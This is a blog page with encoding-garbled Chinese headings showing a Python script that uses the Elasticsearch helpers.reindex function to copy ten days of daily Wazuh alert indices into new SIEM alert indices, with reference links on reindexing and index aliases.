          <h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><ul>
<li><strong><a target="_blank" rel="noopener" href="https://javasgl.github.io/elastic-search-reindex/">ä½¿ç”¨ reindex æ¥ä¿®æ”¹ elasticsearch ç´¢å¼•mapping</a></strong></li>
<li><strong><a target="_blank" rel="noopener" href="https://javasgl.github.io/use-alias-migrate-index/">ä½¿ç”¨ Elasticsearch alias åŠŸèƒ½åˆ‡æ¢ index</a></strong></li>
<li><strong><a target="_blank" rel="noopener" href="https://blog.csdn.net/mlljava1111/article/details/51218868">Elasticsearchæ›´æ”¹mapping(ä¸åœæœåŠ¡é‡å»ºç´¢å¼•)</a></strong></li>
<li><strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jajian/p/10152681.html">Elasticsearch æŠ€æœ¯åˆ†æï¼ˆä¸‰ï¼‰ï¼š ç´¢å¼•åˆ«åAliasesé—®é¢˜</a></strong></li>
<li><strong><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f67b046b4d3f">Elasticsearch å®æˆ˜æ¡ˆä¾‹ï¼ˆç´¢å¼•åˆ‡åˆ†ã€æ¨¡æ¿ã€åˆ«åã€æ•°æ®è¿ç§»ï¼‰</a></strong></li>
<li><strong><a target="_blank" rel="noopener" href="http://abusehub-reindex.py/">abusehub-reindex.py/</a></strong></li>
</ul>
<h4 id="reindex"><a href="#reindex" class="headerlink" title="reindex"></a>reindex</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> elasticsearch <span class="keyword">import</span> Elasticsearch</span><br><span class="line"><span class="keyword">from</span> elasticsearch <span class="keyword">import</span> helpers</span><br><span class="line"></span><br><span class="line">host = [<span class="string">&#x27;es_host1&#x27;</span>, <span class="string">&#x27;es_host2&#x27;</span>, <span class="string">&#x27;es_host3&#x27;</span>]</span><br><span class="line">port = <span class="number">9200</span></span><br><span class="line">timeout = <span class="number">600</span></span><br><span class="line">auth_user = <span class="string">&#x27;elastic&#x27;</span></span><br><span class="line">auth_password = <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line">use_ssl = <span class="literal">True</span></span><br><span class="line">ca_certs = <span class="string">&#x27;/opt/certs/ca/ca.crt&#x27;</span></span><br><span class="line"></span><br><span class="line">es = Elasticsearch(host, port=port, timeout=timeout, http_auth=(auth_user, auth_password), verify_certs=<span class="literal">True</span>, use_ssl=use_ssl, ca_certs=ca_certs)</span><br></pre></td></tr></table></figure>



<h5 id="æŒ‰ç…§æŒ‡å®šæ—¥æœŸé‡å»ºç´¢å¼•"><a href="#æŒ‰ç…§æŒ‡å®šæ—¥æœŸé‡å»ºç´¢å¼•" class="headerlink" title="æŒ‰ç…§æŒ‡å®šæ—¥æœŸé‡å»ºç´¢å¼•"></a>æŒ‰ç…§æŒ‡å®šæ—¥æœŸé‡å»ºç´¢å¼•</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">begin_date = (datetime.datetime.now() - datetime.timedelta(days = <span class="number">10</span>)).strftime(<span class="string">&quot;%Y.%m.%d&quot;</span>)</span><br><span class="line">begin_date = datetime.datetime.strptime(begin_date, <span class="string">&quot;%Y.%m.%d&quot;</span>)</span><br><span class="line">end_date = (datetime.datetime.now() - datetime.timedelta(days = <span class="number">1</span>)).strftime(<span class="string">&quot;%Y.%m.%d&quot;</span>)</span><br><span class="line">end_date = datetime.datetime.strptime(end_date, <span class="string">&quot;%Y.%m.%d&quot;</span>)</span><br><span class="line"></span><br><span class="line">date_list = []</span><br><span class="line"><span class="keyword">while</span> begin_date &lt;= end_date:</span><br><span class="line">    date_str = begin_date.strftime(<span class="string">&quot;%Y.%m.%d&quot;</span>)</span><br><span class="line">    date_list.append(date_str)</span><br><span class="line">    begin_date += datetime.timedelta(days=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">date_list</span><br><span class="line">[<span class="string">&#x27;2020.03.19&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.20&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.21&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.22&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.23&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.24&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.25&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.26&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.27&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.28&#x27;</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chunk_size = <span class="number">10000</span></span><br><span class="line"><span class="keyword">for</span> day <span class="keyword">in</span> date_list:</span><br><span class="line">    source_index = <span class="string">&#x27;wazuh-alerts-3.x-&#x27;</span> + day</span><br><span class="line">    target_index = <span class="string">&#x27;siem-alerts-&#x27;</span> + day</span><br><span class="line">    helpers.reindex(</span><br><span class="line">        client=es, source_index=source_index, target_index=target_index, </span><br><span class="line">        target_client=es, chunk_size=chunk_size</span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(source_index + <span class="string">&#x27; -&gt; &#x27;</span> + target_index + <span class="string">&#x27; fin.&#x27;</span>)</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="ä¸Šä¸€é¡µ"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="ä¸‹ä¸€é¡µ"></i></a>
  </nav>
<script src="/js/comments.js"></script>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2026</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Canon</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="ç«™ç‚¹æ€»å­—æ•°">230k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="ç«™ç‚¹é˜…è¯»æ—¶é•¿">3:29</span>
  </span>
</div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  
<script src="/js/third-party/search/local-search.js"></script>






  





</body>
</html>
